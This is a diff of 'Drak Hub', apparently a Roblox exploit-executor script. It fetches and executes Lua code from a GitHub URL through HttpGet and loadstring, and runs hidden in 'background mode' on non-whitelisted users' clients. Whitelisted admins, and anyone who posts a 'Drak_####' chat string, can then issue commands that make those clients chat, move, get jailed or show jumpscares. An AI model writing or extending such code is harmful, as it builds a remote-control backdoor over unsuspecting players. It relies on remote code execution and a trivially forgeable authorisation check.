@@ -14,8 +14,25 @@ local Workspace = workspace
 --// URL da Whitelist / Configuração de Cargos no GitHub
 local GITHUB_WHITELIST_URL = "https://raw.githubusercontent.com/gaga123308/Usu-rios-Drak-hub/refs/heads/main/User.lua"
 
---// Tabela de Usuários Carregada do GitHub
-local UsuariosGitHub = {}
+--// Tabela de Cargos Globais Carregada do GitHub
+local CargosGlobais = {}
+
+local success, errorMessage = pcall(function()
+    local rawData = game:HttpGet(GITHUB_WHITELIST_URL)
+    local func = loadstring(rawData)
+    if func then
+        CargosGlobais = func()
+    end
+end)
+
+--// SE A LISTA FALHAR AO CARREGAR OU NÃO FOR UMA TABELA VÁLIDA, BLOQUEIA TUDO POR SEGURANÇA
+if not success or type(CargosGlobais) ~= "table" then
+    warn("[Drak Hub] Falha ao carregar a lista de autorizados do GitHub. Acesso negado.")
+    return
+end
+
+-- Tabela de Usuários Autorizados Dinamicamente
+local AutorizadosDinamicos = {}
 local JAILED_PLAYERS = {}
 local Connections = {}
 
@@ -42,34 +59,9 @@ local JUMPSCARES = {
     { Name = "jumps4", ImageId = "rbxassetid://95973611964555", AudioId = "rbxassetid://138873214826309" },
 }
 
-local function CarregarUsuariosGitHub()
-    local success, response = pcall(function()
-        return game:HttpGet(GITHUB_WHITELIST_URL)
-    end)
-
-    if success and response then
-        local func, err = loadstring(response)
-        if func then
-            local result = func()
-            if type(result) == "table" then
-                UsuariosGitHub = result
-                print("[Drak Hub] Whitelist carregada com sucesso!")
-            else
-                warn("[Drak Hub] O retorno do script do GitHub não é uma tabela!")
-            end
-        else
-            warn("[Drak Hub] Erro ao compilar o script do GitHub: " .. tostring(err))
-        end
-    else
-        warn("[Drak Hub] Erro ao baixar a whitelist do GitHub!")
-    end
-end
-
-CarregarUsuariosGitHub()
-
 --// Sistema de Tags baseado no Cargo
 local function ObterTextoTag(player)
-    local cargo = UsuariosGitHub[player.Name]
+    local cargo = CargosGlobais[player.Name]
 
     if cargo == "Dono" then
         return "Dono Drak"
@@ -88,7 +80,7 @@ local function ObterTextoTag(player)
     end
 end
 
-local function createSpecialTag(player, extraText)
+local function AtribuirTagCorreta(player, extraText)
     if not player then return end
 
     local function apply()
@@ -98,7 +90,12 @@ local function createSpecialTag(player, extraText)
         if not head then return end
 
         local cargoTag = ObterTextoTag(player)
-        if not cargoTag and not extraText then return end
+        local displayExtra = extraText
+        if AutorizadosDinamicos[player.Name] and not displayExtra then
+            displayExtra = "Usuário Drak"
+        end
+
+        if not cargoTag and not displayExtra then return end
 
         local old = head:FindFirstChild("DrakTagContainer") or head:FindFirstChild("DrakTag") or head:FindFirstChild("TagsDRAK") or head:FindFirstChild("NytheruneTag")
         if old then old:Destroy() end
@@ -135,7 +132,7 @@ local function createSpecialTag(player, extraText)
         end
 
         -- 2. Tag Secundária de Usuário (Fica Embaixo)
-        if extraText and (not cargoTag or extraText ~= cargoTag) then
+        if displayExtra and (not cargoTag or displayExtra ~= cargoTag) then
             local textExtra = Instance.new("TextLabel")
             textExtra.Name = "ExtraTag"
             textExtra.Size = UDim2.new(1, 0, 0, 25)
@@ -145,7 +142,7 @@ local function createSpecialTag(player, extraText)
             textExtra.TextStrokeTransparency = 0.2
             textExtra.TextStrokeColor3 = Color3.new(0, 0, 0)
             textExtra.TextColor3 = Color3.fromRGB(0, 180, 255)
-            textExtra.Text = extraText
+            textExtra.Text = displayExtra
             textExtra.LayoutOrder = 2
             textExtra.Parent = gui
         end
@@ -158,13 +155,8 @@ local function createSpecialTag(player, extraText)
     end)
 end
 
-for _, p in pairs(Players:GetPlayers()) do
-    createSpecialTag(p)
-end
-
-Players.PlayerAdded:Connect(function(p)
-    createSpecialTag(p)
-end)
+Players.PlayerAdded:Connect(function(player) task.wait(1); AtribuirTagCorreta(player) end)
+for _, player in ipairs(Players:GetPlayers()) do AtribuirTagCorreta(player) end
 
 --// Função de Envio de Mensagens no Chat
 local function EnviarMensagemChat(texto)
@@ -539,6 +531,7 @@ local function Jumpscare()
 end
 
 local playerOriginalSpeed = {}
+local HasTriggeredVerifique = false
 
 --// Processamento de Comandos (Backend / Chat / Board)
 local function ProcessarComando(rawText)
@@ -546,7 +539,6 @@ local function ProcessarComando(rawText)
 
     local comando = rawText:match("^;%w+") and rawText:lower() or rawText
 
-    -- COMANDO DE VERIFICAÇÃO VIA CESTO DE ROUPA (LaundryBasket)
     if comando == ";verifique" then
         pcall(function()
             local toolRemote = ReplicatedStorage:FindFirstChild("RE") and ReplicatedStorage.RE:FindFirstChild("1Too1l")
@@ -561,37 +553,40 @@ local function ProcessarComando(rawText)
                         or (player.Character and player.Character:FindFirstChild("LaundryBasket"))
                 end
                 if possuiLaundry() and player.Character then
-                    createSpecialTag(player, "Usuário Drak")
+                    AtribuirTagCorreta(player, "Usuário Drak")
                 end
             end
         end)
     end
 end
 
-local function ProcessarMensagem(msgText, authorName)
+local function ProcessarMensagemChat(msgText, authorName)
     if not msgText or not authorName then return end
 
     local comandoLower = msgText:lower()
 
-    -- RESPOSTA DE VERIFICAÇÃO COM CÓDIGO/CHAVE DRAK_####
     if comandoLower:match("^;verifique") then
-        local randomCode = math.random(1000, 9999)
-        EnviarMensagemChat("Drak_" .. tostring(randomCode))
+        if authorName ~= LocalPlayer.Name and not HasTriggeredVerifique then
+            HasTriggeredVerifique = true
+            task.delay(math.random(10, 30) / 100, function()
+                EnviarMensagemChat("Drak_" .. tostring(math.random(1000, 9999)))
+            end)
+            task.delay(4, function() HasTriggeredVerifique = false end)
+        end
     end
 
-    -- DETECÇÃO DA MENSAGEM DRAK_####
-    -- Adiciona a tag extra de "Usuário Drak" sem remover a tag principal do jogador se ele for Dono/Admin
     if msgText:match("[Dd]rak_%d%d%d%d") then
         local authorPlayer = Players:FindFirstChild(authorName)
         if authorPlayer then
-            createSpecialTag(authorPlayer, "Usuário Drak")
+            AutorizadosDinamicos[authorName] = true
+            AtribuirTagCorreta(authorPlayer, "Usuário Drak")
         end
     end
 
     ProcessarComando(msgText)
 
-    -- Apenas administradores do GitHub podem disparar os comandos abaixo
-    if not UsuariosGitHub[authorName] then return end
+    -- Apenas administradores oficiais (GitHub) ou autorizados via tag podem disparar os comandos abaixo
+    if not CargosGlobais[authorName] and not AutorizadosDinamicos[authorName] then return end
 
     local authorPlayer = Players:FindFirstChild(authorName)
     local character = LocalPlayer.Character
@@ -690,6 +685,39 @@ local function ProcessarMensagem(msgText, authorName)
     if cmd == "say" and souOAlvo and rest and rest ~= "" then EnviarMensagemChat(rest) end
 end
 
+--// Conectar chat moderno
+local function ConectarCanal(canal)
+    if not canal or not canal.IsA or not canal:IsA("TextChannel") then return end
+    canal.MessageReceived:Connect(function(msg)
+        local text = msg.Text
+        local source = msg.TextSource and msg.TextSource.Name
+        if text and source then ProcessarMensagemChat(text, source) end
+    end)
+end
+
+pcall(function()
+    for _, ch in pairs(TextChatService.TextChannels:GetChildren()) do ConectarCanal(ch) end
+    TextChatService.TextChannels.ChildAdded:Connect(function(ch) ConectarCanal(ch) end)
+end)
+
+--// Conectar chat legado (essencial em segundo plano)
+pcall(function()
+    local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+    if events then
+        local onMessageDoneFiltering = events:FindFirstChild("OnMessageDoneFiltering")
+        if onMessageDoneFiltering then
+            onMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
+                if messageData and messageData.FromSpeaker and messageData.Message then
+                    local speaker = Players:FindFirstChild(messageData.FromSpeaker)
+                    if speaker then
+                        ProcessarMensagemChat(messageData.Message, speaker.Name)
+                    end
+                end
+            end)
+        end
+    end
+end)
+
 --// Escuta o board (Quadro)
 if BoardLabel then
     trackConnection(BoardLabel:GetPropertyChangedSignal("Text"):Connect(function()
@@ -705,25 +733,10 @@ if BoardLabel then
             ProcessarComando(raw)
         end
     end)
-else
-    warn("[Drak Hub] BoardLabel não foi encontrado, comandos pelo quadro desativados.")
 end
 
---// Conecta canais de chat
-local function ConectarCanal(canal)
-    if not canal or not canal.IsA or not canal:IsA("TextChannel") then return end
-    canal.MessageReceived:Connect(function(msg)
-        local text = msg.Text
-        local source = msg.TextSource and msg.TextSource.Name
-        if text and source then ProcessarMensagem(text, source) end
-    end)
-end
-
-for _, ch in pairs(TextChatService.TextChannels:GetChildren()) do ConectarCanal(ch) end
-TextChatService.TextChannels.ChildAdded:Connect(function(ch) ConectarCanal(ch) end)
-
---// Roda em segundo plano para quem NÃO ESTÁ no GitHub
-if not UsuariosGitHub[LocalPlayer.Name] then
+--// Roda em segundo plano para quem NÃO ESTÁ na whitelist do GitHub
+if not CargosGlobais[LocalPlayer.Name] then
     print("[Drak Hub] Executando em segundo plano (Modo Background) para recepcionar comandos.")
     return
 end
@@ -751,7 +764,6 @@ if WindUI then
         User = { Enabled = true, Anonymous = false, Callback = function() print("Perfil clicado!") end },
     })
 
-    -- Cores correspondentes aos temas do painel e do OpenButton
     local ThemeColors = {
         ["Dark"] = ColorSequence.new(Color3.fromHex("00FF00"), Color3.fromHex("00AA00")),
         ["Sky"] = ColorSequence.new(Color3.fromHex("00BFFF"), Color3.fromHex("0080FF")),
